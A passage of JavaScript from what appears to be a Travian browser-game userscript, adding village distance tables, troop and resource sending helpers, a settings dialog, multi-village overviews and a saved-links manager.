	var sO3 = [gtext('none'),'x0.33','x0.5','x0.67','x1.5','x2','x3'];
	for( var j = 0; j < sO3.length; j++ ) newOption(sel3, sO3[j], j);
	sel3.selected = RB.Setup[3]; sel3.value = RB.Setup[3];
	var artSp = $em('SPAN',[' , ',sel3],[['title',gtext("speedart")]]);

	var pp = $em('P',[arena + ' : ',sel,(ver4FL?t4P:''),artSp,' ',kirURL, attbl],[['style','margin:10px 30px 0px;']]);
	cont.appendChild(pp);
	document.addEventListener("change", updateDistTable, false);

	var villages = $g(pageElem[5]);
	if ( ! villages ) return;
	villages = villages.tBodies[0].rows;
	for( var i = 0; i < villages_id.length; i++ ) {
		var distance = parseFloat(calcDistance( villages_id[i], curD ).toFixed(1));
		villages[i].cells[3].appendChild($t(" <-> " + distance));
	}
}

function distanceToTargetVillages() {
	var vtable = $g("villages");
	if ( ! vtable ) return;
	var fl = false;
	// fill rows
	var vtrows = vtable.tBodies[0].rows;
	for (var mr = 0; mr < vtrows.length; mr++)
	{
		var vtLink = vtrows[mr].cells[0].getElementsByTagName('a');
		if( vtLink.length > 0 ) {
			vtLink = vtLink[0];
			var vURL = vtLink.getAttribute("href");
			distanceTooltip(vtLink,0);
			sendResTropAdd(vtLink, 1);
			linkHint(vtLink);
			var Rej = /d=(\d+)/i;
			var vID = Rej.exec(vURL)[1];
			var distance = parseFloat(calcDistance( vID, village_aid ).toFixed(1));
			vtrows[mr].appendChild($c(distance));
			fl = true;
		}
	}
	if( fl ) {
		// add additional field
		var vtrows = vtable.tHead.rows;
		if( ! ver4FL ) vtrows[0].cells[0].setAttribute("colspan","4");
		vtrows[ver4FL?0:1].appendChild($c('&lt;-&gt;',[['style','width:10%;']]));
	}
}

function fillXY ( nXY ) {
	if( /[&?]z=\d/.test(crtPath) ) return;
	var myVid = nXY || RB_getValue(GMcookieID + 'next', -1);
	if( myVid > 0 ) {
		var arXY = id2xy( myVid );
		if( $gn('x').length < 1 ) return;
		$gn('x')[0].value = arXY[0];
		$gn('y')[0].value = arXY[1];
		nextFL = false;
	}
}

function fillXYtoRP() {
	fillXY();
	if( $g('troops') ) {
		var ss = $g('btn_ok');
		if( ss ) {
			addShowDistanceIn( ss, 0 );
			ss.parentNode.addEventListener('keyup', a2bInfo, false);
			ss.parentNode.addEventListener('click', a2bInfo, false);
		}
	}
}

function sendArmy( myVid ) {
	if( $gn('t9').length > 0 ) {
		fillXY( myVid );
		showDistanceIn( 0 );
	} else {
		if( myVid != village_aid ) RB_setValue(GMcookieID + 'next', myVid);
		document.location.href= RB.dictFL[23] == 0 ? 'a2b.php': 'build.php?id=39&tt=2';
	}
	return false;
}

function sendResourses( myVid ) {
	if( $gn('r1').length > 0 ) {
		fillXY( myVid );
		showDistanceIn( -1 );
	} else {
		if( RB.village_Dorf2[0] != 0 ) {
			if( myVid != village_aid ) RB_setValue(GMcookieID + 'next', myVid);
			document.location.href='build.php?id=' + RB.village_Dorf2[0] +(RB.dictFL[23]==0?'':'&t=5');
		} else {
			document.location.href='build.php?z=' + myVid + '&gid=17' +(RB.dictFL[23]==0?'':'&t=5');
		}
	}
	return false;
}

// 0-market, 1-barracks, 2-stable, 3-workshop, 4-Tournament Square
function parseDorf2 () {
	var base = $g('village_map');
	if( !(base) ) return;
	var fl = false;
	var buildsID = ['g17','g19','g20','g21','g14'];
	var buildsNum = [0,0,0,0,0];
	if( ver4FL ) {
		var vm = $g('village_map');
		if( vm ) {
			var allAreas = $gt('AREA',vm);
			var allIMG = $gt('IMG',vm);
			for( var t=0; t<allAreas.length; t++ ) {
				for( var i = 0; i < buildsID.length; i++ ) {
					var Rej = new RegExp(buildsID[i]);
					if( Rej.test(allIMG[t].getAttribute('class')) )
						buildsNum[i] = allAreas[t].getAttribute('href').match(/id=(\d+)/)[1];
				}
			}
		}
	} else {
		var Rej = /class="building .(\d+) (\w+)"/gi;
		while ((bid = Rej.exec(base.innerHTML)) != null) {
			for( var i = 0; i < buildsID.length; i++ ) {
				if( bid[2] == buildsID[i] ) buildsNum[i] = parseInt(bid[1])+18;
			}
		}
	}
	for( var i = 0; i < buildsID.length; i++ ) {
		if( buildsNum[i] != RB.village_Dorf2[i] ) {
			RB.village_Dorf2[i] = buildsNum[i];
			fl = true;
		}
	}
	if( buildsNum[4] > 0 ) { // search&save Tournament Square
		var tur = $xf('.//img[contains(@class,"g14")]','f',base).getAttribute('alt').match(/\d+/)[0];
		if( tur != RB.village_Var[1] ) {
			RB.village_Var[1] = tur;
			saveVCookie( 'VV', RB.village_Var );
		}
	} else if( RB.village_Var[1] > 0 ) {
		RB.village_Var[1] = 0;
		saveVCookie( 'VV', RB.village_Var );
	}
	var dictsFL = [['g17',7],['g19',8],['g20',9],['g21',10],['g16',6],['g14',3]];
	for( var i = 0 ; i < dictsFL.length; i++ ) {
		if( RB.dictFL[dictsFL[i][1]] == 0 ) {
			var turF = $gc(dictsFL[i][0],base);
			if( turF.length > 0 ) {
				turD = turF[0].getAttribute('alt').firstText();
				if( /\d/.test(turD) ) {
					turD = turD.split(' ');
					turD.length = turD.length - 2;
					var turD = turD.join(' ');
				}
				RB.dictionary[dictsFL[i][1]] = turD;
				saveCookie( 'Dict', 'dictionary' );
				RB.dictFL[dictsFL[i][1]] = 1;
				saveCookie( 'DictFL', 'dictFL' );
			}
		}
	}
	if( fl ) saveVCookie( 'Dorf2', RB.village_Dorf2 );
}

/************************* Setup ***************************/

function okTD( funcOk, funcCancel, sp ) {
	var newBTO = $ee('BUTTON',gtext("ok"),[['class',allIDs[15]],['onClick',jsNone]]);
	newBTO.addEventListener('click', funcOk, true);
	var newBTX = $ee('BUTTON',gtext("cancel"),[['class',allIDs[15]],['onClick',jsNone]]);
	newBTX.addEventListener('click', funcCancel, true);
	var at = [['style','text-align:right']];
	if( parseInt(sp) != NaN ) at.push(['colspan',sp]);
	return $em('TD',[newBTO,newBTX],at);
}

function gtext ( txt ) {
	var ntxt = typeof DICT['en'][txt] == 'undefined' ? 'Error!': DICT['en'][txt];
	if( typeof DICT[LC] == 'undefined' ) return ntxt;
	if( typeof DICT[LC][txt] != 'undefined' ) ntxt = DICT[LC][txt];
	else if( typeof DICT[LC]["fb"] != 'undefined' )
		if( typeof DICT[DICT[LC]["fb"]] != 'undefined' )
			if( typeof DICT[DICT[LC]["fb"]][txt] != 'undefined' ) ntxt = DICT[DICT[LC]["fb"]][txt];
	return ntxt;
}

RB.dSetup = [//	0	1	2	3	4	5	6	7	8	9
	/* 0 */	version,0,	0,	0,	1,	7,	1,	1,	3,	0,
	/* 1 */		2,	1,	2,	0,	1,	1,	2,	0,	1,	2,
	/* 2 */		1,	1,	1,	10,	80,	1,	1,	0,	0,	audiofile,
	/* 3 */		0,	15,	1,	1,	0,	0,	1,	1,	1,	0,
	/* 4 */		'',	'',	'',	'',	'',	0
			];
RB.Setup = RB.dSetup.slice();

function rbSetup () {
	var analyzers = [gtext('incomreso')[0]];
	for( var i = 1; i <= serversAC; i++ ) {
		analyzers[i] = userActivityServers( i, 1, true )[0];
	}
	var normProd = [gtext('incomreso')[0],gtext("normal")];
	for( i = 2; i < normalizeProductionCount+2; i++ ) {
		normProd[i] = RB.dictTR[i+(10*RB.Setup[2])-1];
	}
	for( i = 0; i < 5; i++ )
		if( RB.Setup[40+i].length<2 ) RB.Setup[40+i] = cnColors[i];

	// 0-type(Info,CheckBox,Text,SELect,SPan,Button), 1-setupNum, 2-text, 3-ext
	var aRBS = [
		['I', 0, gtext("info")],
			['SEL', 1, gtext("scrlang")+(LC != 'en' ? ' /language':''), langs],
			['SEL', 2, gtext("yourrace"), gtext("racelist")],
			['T', 45, gtext("sspeed"), gtext("sspeedh")],
			['SEL', 3, gtext("speedart"), [gtext('none'),'x0.33','x0.5','x0.67','x1.5','x2','x3']],
			['SEL', 9, arena, [gtext("auto"),0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]],
			['T', 24, gtext("cranny"), gtext("crannyh")],
		['I', 0, gtext("builtin")],
			['SEL', 22, gtext("normalize"), normProd, gtext("builtinh")],
			['CB', 25, gtext("banalyze")],
			['CB', 26, gtext("cropfind")],
			['SEL', 30, gtext("adetect"), gtext("adetecto"), gtext("adetecth")],
			['T', 31, gtext("adetectt")],
			['CB', 32, gtext("buildhint")],
			['CB', 37, gtext("bmove")],
		['I', 0, gtext("onallp")],
			['CB', 7, gtext("dontwrap"), gtext("dontwraph")],
			['SEL',14, gtext("buildand"), gtext('buildands'), gtext("buildandh")],
			['CB',15, gtext("sendres")],
			['CB',18, gtext("sendmess")],
			['SEL',19, gtext("analyzer"), analyzers],
			['B', 0, gtext("analyzer"), [gtext('settings'),'analyzerSetup']],
			['SEL',16, gtext("bigicon"), gtext('addvtableo')],
			['SEL',21, gtext("addvtable"), gtext('addvtableo'), gtext("addvtableh")],
			['CB',17, gtext("opennote")],
			['SEL',35, gtext("notesize"), ['40x15','55x20','70x30','60x45','40x8','30х34']],
			['CB',34, gtext("openoview")],
		['I', 0, gtext("resbar")],
			['CB', 4, gtext("showres")],
			['T', 6, gtext("redbl")],
			['T', 5, gtext("yellowbl")],
		['I', 0, gtext("marketpl")],
			['SEL', 8, gtext("mfilter"), gtext("mfiltero")],
			['CB', 11, gtext("npcsum"), gtext("npcsumh")],
			['T', 23, gtext("bidinc"), gtext("bidinch")],
			['CB', 33, gtext("show3x"), gtext("show3xh")],
		['I', 0, gtext("rpandmp")],
			['SEL', 10, gtext("incomres"), gtext("incomreso")],
			['SEL', 20, gtext("troopsI"), gtext("troopsIo")],
			['SEL', 27, gtext("defRP"), [RB.dictionary[16],RB.dictionary[17],RB.dictionary[18]]],
		['I', 0, gtext("links")],
			['SEL',12, gtext("showls"), gtext("showlso")],
			['CB', 36, gtext("showAsSN")],
			['T', 'ln2', gtext("savedls")],
			['T', 'ln', gtext("savedls")+' (2)'],
			['T', 'ln3', gtext("savedls")+' (3)'],
		['I', 0, gtext("notifi")],
			['SEL',28, gtext("method"), [gtext('none'),'alert','HTML5 audio','EMBED audio','FLASH player']],
			['T', 29, gtext("audiourl"), 'http://... .mp3 .ogg .wav'],
			['B', 0, gtext("audiotest"), ['test','testAudio']],
		['I', 0, gtext("colorCustomize"), gtext("colorHint")],
			['T', 40, gtext("color0")],
			['T', 41, gtext("color1")],
			['T', 42, gtext("color2")],
			['T', 43, gtext("color3")],
			['T', 44, gtext("color4")],
		['I', 0, gtext("savedd"), gtext("saveddh")],
			['B', 0, gtext("savedelall"), [gtext("del"),'allStorageDelete']],
		['I', 0, '']
	];

	if( closeWindowN(0) ) return;

	function setupSave() {
		var aS = $gt("SELECT",$g(allIDs[6]));
		for (var i = 0; i < aS.length; i++) RB.Setup[parseInt(aS[i].name)] = aS[i].value;
		var aS = $gt("INPUT",$g(allIDs[6]));
		for (var i = 0; i < aS.length; i++) {
			crtValue = aS[i].value;
			if( aS[i].type == 'checkbox') crtValue = (aS[i].checked == true ? '1' : '0');
			if( isNaN(aS[i].name) )
				RB_setValue(GMcookieID + aS[i].name, crtValue);
			else
				RB.Setup[parseInt(aS[i].name)] = crtValue;
		}
		if(RB.Setup[29].length < 2) RB.Setup[29] = audiofile;
		saveCookie( 'RBSetup', 'Setup' );
		destroySetup();
		location.reload(true);
	}
	function destroySetup() {
		closeWindowN(0);
	}

	setupD = $e('TABLE',[['id',allIDs[6]]]);
	var newTR = $ee('TR',$c(gtext("svers")+': ' + version));//RB.Setup[0]));
	newTR.appendChild(okTD(setupSave,destroySetup));
	setupD.appendChild(newTR);

	for( var i = 0; i < aRBS.length; i++ ) {
		if( aRBS[i][0] == 'I' ) {
			var newTt = $ee('SPAN',aRBS[i][2]);
			if( typeof aRBS[i][3] == 'string' && aRBS[i][3].length > 1 ) {
				$at(newTt,[['title',aRBS[i][3]]]);
				newTt.appendChild(trImg(allIDs[47]));
			}
			var newTR = $ee('TR',$c(newTt,[['colspan','2'],['style','text-align:center']]));
		} else {
			var vN = isNaN(aRBS[i][1]) ? RB_getValue(GMcookieID + aRBS[i][1], "") : RB.Setup[aRBS[i][1]];
			var newTt = $ee('SPAN',aRBS[i][2]);
			var hn = aRBS[i][0] == 'SEL' ? 4: 3;
			if( typeof aRBS[i][hn] == 'string' && aRBS[i][hn].length > 1 ) {
				$at(newTt,[['title',aRBS[i][hn]]]);
				newTt.appendChild(trImg(allIDs[47]));
			}
			var newTR = $ee('TR',$c(newTt));
			switch( aRBS[i][0] ) {
				case 'CB': var newO = $e('INPUT',[['type', 'CHECKBOX']]); if(vN == 1) $at(newO, [['checked', true]]); break;
				case 'T': var newO = $e('INPUT',[['type', 'TEXT'],['value',vN]]); break;
				case 'SEL': var newO = $e('SELECT');
					for( var j = 0; j < aRBS[i][3].length; j++ ) newOption(newO, aRBS[i][3][j], j);
					newO.selected = vN; newO.value = parseInt(vN); break;
				case 'SP': var newO = $ee('SPAN',vN); break;
				case 'B': var newO = $ee('BUTTON',aRBS[i][3][0],[['class',allIDs[15]],['type', 'BUTTON'],['onClick',jsNone]]);
					newO.addEventListener('click', eval(aRBS[i][3][1]), true);
					break;
			}
			$at(newO, [['name', aRBS[i][1]]]);
			newTR.appendChild($c( newO, [['style','text-align:center;']]));
		}
		setupD.appendChild(newTR);
	}

	var newTR = $ee('TR',$em('TD',[gtext("youlang")+': ',$ee('b',navigator.language)]));
	newTR.appendChild(okTD(setupSave,destroySetup));
	setupD.appendChild(newTR);

	windowID[0] = makeFloatD(setupD, 0);
}

function allStorageDelete () {
	if( ! confirm(gtext("savedelallh")) ) return;
	for( var i = 0; i< allCookies.length; i++ ) {
		RB_deleteValue( GMcookieID + allCookies[i] );
	}
	document.location.href = fullName + 'logout.php';
}

function pageNoWrap() {
	if( ver4FL ) return;
	var lf = $g(pageElem[0]);
	var rf = $g(pageElem[2]);
	var mid = $g(pageElem[3]);
	mid.style.width = (lf.clientWidth + cont.clientWidth + rf.clientWidth + 15) + 'px';
	if( $g('loyality') ) $at($g('loyality'),[['style','top:-10px;']]);
	if( $g("resWrap").offsetLeft != 0 ) {
		var rW = $g('res').clientWidth;
		var cW = cont.clientWidth, cF = offsetPosition( cont )[0];
		var rz = docDir[0]=='left'? cF-rW/2: rW/2-cW-cF;
		$at($g("resWrap"),[['style','margin-'+docDir[0]+':'+Math.round(rz)+'px;']]);
	}
	contXY = offsetPosition( cont );
	contRight = ltr ?  contXY[0] + cont.clientWidth : contXY[0];
	contTop = contXY[1];
}

function parseSpieler () {
	var Rej = new RegExp('uid=' + userID);
	if( ! Rej.test(crtPath) && crtPath.indexOf('uid=') != -1 ) return;
	try {
		var capitalS = $xf('./tbody/tr/td/span[not(./a)]','f',$g('villages'));
		var capital = capitalS.parentNode.getElementsByTagName('A')[0].getAttribute('href').match(/d=(\d+)/)[1];
	} catch(err) {
		var capital = 0;
	}
	var aID = $xf('.//a[contains(@href,"allianz.php?aid=")]','f',$g('profile'));
	var fl = false;
	if( aID ) {
		aID = aID.getAttribute('href').match(/aid=(\d+)/)[1];
		if( aID != RB.dictionary[13] ) {
			fl = true;
			RB.dictionary[13] = aID;
		}
	} else if( RB.dictionary[13] != 0 ) {
		RB.dictionary[13] = 0;
		aID = 0;
	}
	if( RB.dictionary[0] != capital || RB.dictFL[1] == 0 || fl ) {
		var ally = ver4FL ? $xf('.//table[@id="details"]//tr','l',cont).snapshotItem(2).innerHTML.match(/>(.+?):?</)[1] :
				$xf('.//table[@id="profile"]//table/tbody/tr','l',cont).snapshotItem(2).innerHTML.match(/>(.+?):?</)[1];
		RB.dictionary[0] = capital;
		RB.dictionary[1] = ally;
		saveCookie( 'Dict', 'dictionary' );
		RB.dictFL[1] = 1;
		saveCookie( 'DictFL', 'dictFL' );
	}
}

var vLinksPat = ver4FL?'//div[@id="'+(ver42FL?'sidebarBoxVillagelist':'villageList')+'"]//li/a'+(ver42FL?'/div':''):'//table[@id="vlist"]//div/a[contains(@href, "newdid")]';

function overviewWarehouse () {
	function refreshOview () {
		if( (parseInt(RB.overview[1]) + 900) > nowTime ) return;
		RB.overview[0] = 0;
		RB.overview[1] = crtPath.split("?")[0] + clearAntibot( linkVSwitch[village_aNum] );
		saveCookie('OV', 'overview');
		document.location.href=fullName + 'dorf1.php';
	}

	var overviewD = $e('TABLE',[['id',allIDs[8]]]);
	var newTHead = $e('THEAD');

	var refreshImg = $e('IMG',[['src', img_refr],['title',gtext("refresh")],['style','cursor:pointer;']]);
	refreshImg.addEventListener('click', refreshOview, true);
	var newTR = $em('TR',[$c(refreshImg),$c(trImg('r1')),$c(trImg('r2')),$c(trImg('r3')),
		$c(trImg('&nbsp;')),$c(trImg('r4')),$c(trImg('&nbsp;')),$c(trImg('r5')),$c('')]);
	newTHead.appendChild(newTR);

	overviewD.appendChild(newTHead);

	var newTBody = $e('TBODY');
	var t = 0;
	var nowTime = Math.round((new Date().getTime())/1000);
	var vLinks = $xf(vLinksPat,'l');
	for ( var vn = 0; vn < vLinks.snapshotLength; vn++ ) {
		var vName = $a(vLinks.snapshotItem(vn).innerHTML,[['href',linkVSwitch[vn]]]);
		if( villages_id[vn] == village_aid ) $at(vName, [['style','color:#71D000;']]);
		var newTR = $ee('TR',$c(vName));
		loadVCookie('vPPH', 'village_PPH', villages_id[vn]);

		var minLeft = Number.POSITIVE_INFINITY;
		for( var i = 0; i < 4; i++ ) {
			var deltaTime = RB.village_PPH[12] > 0 ? nowTime - parseInt(RB.village_PPH[12]): 0;
			var nowResInV = Math.round(RB.village_PPH[i]/3600 * deltaTime + RB.village_PPH[i+4]);
			if( nowResInV > RB.village_PPH[i+8] ) nowResInV = RB.village_PPH[i+8];
			if( nowResInV < 0 ) nowResInV = 0;
			var secLeft = RB.village_PPH[i] > 0 ? Math.round((RB.village_PPH[i+8] - nowResInV) / (RB.village_PPH[i]/3600)) : Math.round( nowResInV / (RB.village_PPH[i]/3600));
			if( secLeft < minLeft ) minLeft = secLeft;
			var nowResInVP = Math.round(nowResInV / RB.village_PPH[i+8]*100);
			var clr;
			if( secLeft < parseFloat(RB.Setup[6])*3600) {
				clr = 3;
			} else if ( secLeft < parseFloat(RB.Setup[5])*3600) {
				clr = 2;
			} else {
				clr = 1;
			}
			var newPval = $ee('DIV',nowResInVP+'%',[['class',allIDs[10]+clr]]);
			newPval.setAttribute("style", "width: " + Math.round(nowResInVP/2) + "px;");
			newTR.appendChild($c(newPval,[['class',allIDs[10]]]));
			if( i > 1 ) {
				timerOv[t] = new Object();
				timerOv[t].time = minLeft;
				timerOv[t].obj = $eT('TD', minLeft, 0, [['class',allIDs[17]]]);
				timerOv[t].dir = RB.village_PPH[i] > 0 ? -1: 1;
				if( Math.abs(minLeft) < 600 ) timerOv[t].obj.setAttribute('style','text-decoration:blink;');
				newTR.appendChild(timerOv[t++].obj);
				minLeft = Number.POSITIVE_INFINITY;
			}
		}
		newTR.appendChild($c(RB.village_PPH[3],[['style','text-align:right']]));
		newTR.appendChild($c(addARLinks(villages_id[vn],0)));
		newTBody.appendChild(newTR);
	}
	overviewD.appendChild(newTBody);
	return overviewD;
}

function trImg ( cl, et ) {
	var ecl = [['class', cl],['src', 'img/x.gif']];
	if( typeof et != 'undefined' ) ecl.push(['title',et]);
	return $e('IMG',ecl);
}

function humanRF ( num ) {
	var rnum = parseInt(num);
	var dnum = Math.abs(rnum);
	var sign = rnum < 0 ? '-': '';
	var ddnum = 0;
	var fnum = '';
	while( dnum > 1000 ) {
		ddnum = ('00'+(dnum % 1000)).substr(-3,3);
		dnum = Math.floor(dnum/1000);
		fnum = ddnum + ',' + fnum;
	}
	fnum = dnum + ',' + fnum;
	return sign+fnum.substr(0,fnum.length-1);
}

function overviewResources () {
	var overviewD = $e('TABLE',[['id',allIDs[8]]]);
	var newTHead = $ee('THEAD',$em('TR',[$c(' '),$c(trImg('r1')),$c(trImg('r2')),$c(trImg('r3')),$c(' '),$c(trImg('r4')),$c(' '),$c(abFL?'&#931;':''),$c(trImg('clock')),$c('')]));

	overviewD.appendChild(newTHead);

	var newTBody = $e('TBODY');
	var t = 0;
	var resSumm = [0,0,0,0];
	var nowTime = Math.round((new Date().getTime())/1000);
	var vLinks = $xf(vLinksPat,'l');
	for ( var vn = 0; vn < vLinks.snapshotLength; vn++ ) {
		var vName = $a(vLinks.snapshotItem(vn).innerHTML,[['href',linkVSwitch[vn]]]);
		if( villages_id[vn] == village_aid ) $at(vName, [['style','color:#71D000;']]);
		var newTR = $ee('TR',$c(vName));
		loadVCookie('vPPH', 'village_PPH', villages_id[vn]);

		var allResInV = 0;
		for( var i = 0; i < 4; i++ ) {
			var deltaTime = RB.village_PPH[12] > 0 ? nowTime - parseInt(RB.village_PPH[12]): 0;
			var nowResInV = Math.round(RB.village_PPH[i]/3600 * deltaTime + RB.village_PPH[i+4]);
			if( nowResInV > RB.village_PPH[i+8] ) nowResInV = RB.village_PPH[i+8];
			if( nowResInV < 0 ) nowResInV = 0;
			resSumm[i] += nowResInV;
			allResInV += nowResInV;
			var attr = [['class',allIDs[19]]];
			if( RB.village_PPH[i] < 0 ) attr[1] = ['style','color:red;'];
			newTR.appendChild($c(humanRF(nowResInV),attr));
			if( i == 2 ) newTR.appendChild($c('/'+RB.village_PPH[8],[['style','font-size:8pt;']]));
		}
		newTR.appendChild($c('/'+RB.village_PPH[11],[['style','font-size:8pt;']]));
		newTR.appendChild($c(abFL?humanRF(allResInV):'',[['style','font-weight:bold;text-align:right']]));
		if( villages_id[vn] != village_aid )
			newTR.appendChild($c(formatTime(getTTime(calcDistance(villages_id[vn],village_aid),MTime[parseInt(RB.Setup[2])]*sM,0,0),0)));
		else
			newTR.appendChild($c('&lt;--'));
		newTR.appendChild($c(addARLinks(villages_id[vn],0)));
		newTBody.appendChild(newTR);
	}
	overviewD.appendChild(newTBody);
	var newTR = $ee('TR',$c('&nbsp;'));
	for( var i = 0; i < 4; i++ ) {
		newTR.appendChild($c(humanRF(resSumm[i]),[['style','text-align:right;']]));
		if( i > 1 ) newTR.appendChild($c(' '));
	}
	newTR.appendChild($c(' ',[['colspan',3]]));
	overviewD.appendChild($ee('TFOOT',newTR));
	return overviewD;
}

function overviewTroops () {
	var overviewD = $e('TABLE',[['id',allIDs[8]]]);

	var newTBody = $e('TBODY');
	var vLinks = $xf(vLinksPat,'l');
	for ( var vn = 0; vn < vLinks.snapshotLength; vn++ ) {
		var vName = $a(vLinks.snapshotItem(vn).innerHTML,[['href',linkVSwitch[vn]]]);
		if( villages_id[vn] == village_aid ) $at(vName, [['style','color:#71D000;']]);
		var newTR = $ee('TR',$c(vName));

		loadZVCookie('Dorf12','village_dorf12',villages_id[vn]);
		var t = 0;
		var hfl = false;
		if( RB.village_dorf12[0] > 0 ) {
			var tT = $e('TABLE',[['class',allIDs[7]],['style','width:100%;']]);
			if( RB.village_dorf12[1] == 'hero' )  hfl = true;
			t = hfl ? 3: 1;
			var fl = false;
			var nR1 = $e('TR');
			var nR2 = $e('TR');
			for( var i = 1; i < 51; i++ ) {
				nR1.appendChild($c(trImg('unit u'+i)));
				if( i == RB.village_dorf12[t] ) {
					nR2.appendChild($c(RB.village_dorf12[t+1]));
					fl = true;
					t += 2;
				} else nR2.appendChild($c(0));
				if( (i%10) == 0 ) {
					if( fl ) {
						tT.appendChild(nR1);
						tT.appendChild(nR2);
						fl = false;
					}
					var nR1 = $e('TR');
					var nR2 = $e('TR');
				}
			}
			newTR.appendChild($c(tT));
		} else newTR.appendChild($c('&nbsp;'));
		if( hfl ) newTR.appendChild($em('TD',[$ee('DIV',trImg('unit uhero')),$ee('DIV',RB.village_dorf12[2])]));
		else newTR.appendChild($c(''));
		newTR.appendChild($c(addARLinks(villages_id[vn],0)));
		newTBody.appendChild(newTR);
	}
	overviewD.appendChild(newTBody);

	return overviewD;
}

function overviewAll () {
	if( closeWindowN(1) ) { timerOv.length = 0; return; }
	if( villages_count < 2 ) return;

	function ovWarehouse () {
		ovBuild(overviewWarehouse());
	}
	function ovResources () {
		ovBuild(overviewResources());
	}
	function ovTroops () {
		ovBuild(overviewTroops());
	}
	function ovBuild ( ovNew ) {
		ovDIV.removeChild(overviewD);
		overviewD = ovNew;
		ovDIV.appendChild(overviewD);
	}
	function overviewClose () {
		timerOv.length = 0;
		closeWindowN(1);
	}

	var ovDIV = $e('DIV');
	var linkOW = $a(gtext("warehouse"),[['href',jsVoid]]);
	linkOW.addEventListener('click', ovWarehouse, true);
	var linkOR = $a(gtext("resources"),[['href',jsVoid]]);
	linkOR.addEventListener('click', ovResources, true);
	var linkOT = $a(gtext("troops"),[['href',jsVoid]]);
	linkOT.addEventListener('click', ovTroops, true);
	var menuD = $em('TD',[linkOW,' | ',linkOR,' | ',linkOT],[['style','text-align:left;']]);

	var menuR = $ee('TR',menuD);

	var newBTX = $ee('BUTTON',gtext("close")+' (X)',[['class',allIDs[15]],['onClick',jsNone],['style','direction:ltr;float:right;']]);
	newBTX.addEventListener('click', overviewClose, true);
	menuR.appendChild($c(newBTX));

	var menuT = $ee('TABLE',menuR,[['style','background-color:#F8F8F8;']]);
	ovDIV.appendChild(menuT);

	var overviewD = overviewWarehouse();

	ovDIV.appendChild(overviewD);
	windowID[1] = makeFloatD(ovDIV, 2);
}

function clearAntibot ( oldURL ) {
	var clearURL = oldURL.replace(/&c=[\w]{6,6}/,'');
	return clearURL;
}

function imgHide ( num ) {
	var o = [['src','img/x.gif'],['class',allIDs[32]]];
	if( RB.bodyH[num] == 1 ) o.push(['style','background-position:0px -12px;']);
	return $e('IMG',o);
}

function saveLink ( lns ) {
	var newCL = '';
	for( var i = 0; i < lns.length; i++ )
		if( /d=\d+/i.test(lns[i]) ) newCL += lns[i] + '@@_';
	RB_setValue(GMcookieID + "ln", newCL);
	redrawLinks();
	convertLinks();
}
function saveLink3 () {
	saveVCookie('ln3', RB.ln3, 1);
	redrawLinks();
	convertLinks();
}
function sortLinks () {
	slt = slt ? false: true;
	redrawLinks();
}
function redrawLinks () {
	$g(windowID[5]).parentNode.removeChild($g(windowID[5]));
	showLinks();
}
var slt = true;
function showLinks () {
	function intShowLinks (fl) {
		var maxLinks = fl ? alinks.length: RB.ln3.length;
		for( var i = 0; i < maxLinks; i++ ) {
			var oneLink = (fl?alinks[i]:RB.ln3[i]).split("\/@_");
			var tVId = parseInt(oneLink[0].match(/d=(\d+)/)[1]);
			var newTR = $e('TR');
			if( flKarte ) {
				if( slt ) {
					var newA = trImg(allIDs[39],gtext("del"));
					newA.addEventListener('click', function(x) { return function() { if( fl ) removeLink(x); else removeLink3(x); }}(i), false);
					var newTD = $c(newA);

					var newA = trImg(allIDs[38],gtext("edit"));
					newA.addEventListener('click', function(x) { return function() { if( fl ) editLink(x); else editLink3(x); }}(i), false);
					newTD.appendChild(newA);

					var newA = fl ? trImg(allIDs[40],gtext("unfix")): trImg(allIDs[41],gtext("fix"));
					newA.addEventListener('click', function(x) { return function() { if(fl) unfixLink(x); else fixLink(x); }}(i), false);
					newTD.appendChild(newA);
					newTR.appendChild(newTD);
				} else {
					if( i > 0 ) {
						var newA = $ee('A',$e('IMG',[['src',img_up]]),[['href',jsVoid]]);
						newA.addEventListener('click', function(x) { return function() { moveLinkUpDown(x); }}([i,(fl?0:1),-1]), false);
						var newTD = $c(newA);
					} else var newTD = $c($e('IMG',[['src', 'img/x.gif'],['style','height:12px;width:12px;']]));

					if( i < maxLinks-1 ) {
						var newA = $ee('A',$e('IMG',[['src',img_down]]),[['href',jsVoid]]);
						newA.addEventListener('click', function(x) { return function() { moveLinkUpDown(x); }}([i,(fl?0:1),1]), false);
						newTD.appendChild(newA);
					} else newTD.appendChild($e('IMG',[['src', 'img/x.gif'],['style','height:12px;width:12px;']]));

					newTR.appendChild(newTD);
				}
			}
			var newA = $a(unesc(oneLink[1]),[['href','karte.php?'+oneLink[0]]]);
			distanceTooltip(newA,0);
			var newTD = $c( newA);
			newTR.appendChild(newTD);
			var newTD = $c(addARLinks(tVId,1));
			newTR.appendChild(newTD);
			newTBody.appendChild(newTR);
		}
		if( i > 0 ) newTBody.appendChild($ee('TR',$c(' ',[['style','height:2px;line-height:2px;background-color:silver;'],['colspan',(flKarte ? 3:2)]])));
	}
	function moveLinkUpDown ( num ) {
		switch ( num[1] ) {
			case 0:
				var oneLink = alinks[num[0]];
				alinks.splice(num[0], 1);
				alinks.splice(num[0]+num[2], 0, oneLink);
				saveLink( alinks );
				break;
			case 1:
				var oneLink = RB.ln3[num[0]];
				RB.ln3.splice(num[0], 1);
				RB.ln3.splice(num[0]+num[2], 0, oneLink);
				saveLink3();
				break;
			case 2:
				var oneLink = clinks[num[0]];
				clinks.splice(num[0], 1);
				clinks.splice(num[0]+num[2], 0, oneLink);
				RB_setValue(GMcookieID + "ln2", clinks.join("@@_")+"@@_");
				redrawLinks();
				break;
		}
	}
	function fixLink ( num ) {
		alinks.push(RB.ln3[num]);
		RB.ln3.splice(num, 1);
		saveVCookie('ln3', RB.ln3, 1);
		saveLink( alinks );
	}
	function unfixLink ( num ) {
		RB.ln3.push(alinks[num]);
		alinks.splice(num, 1);
		saveVCookie('ln3', RB.ln3, 1);
		saveLink( alinks );
	}
	function addLink () {
		var newLink = crtPath.match(/[?&](d=.*)$/i);
		if( newLink.length == 0 ) return;
		newLink = newLink[1];
		var newName = $gt('h1',cont)[0].innerHTML.onlyText().replace(/&.+?;/g, " ");
		newName = prompt(gtext("linkname"), newName);
		if( newName == null ) return;
		var newOneLink = newLink + "\/@_" + esc(newName);
		RB.ln3.push(newOneLink);
		saveLink3();
	}
	function removeLink ( num ) {
		if( ! confirm(gtext("linkdel")+': '+unesc(alinks[num].split("\/@_")[1])+' ?') ) return;
		alinks.splice(num, 1);
		saveLink( alinks );
	}
	function removeLink3 ( num ) {
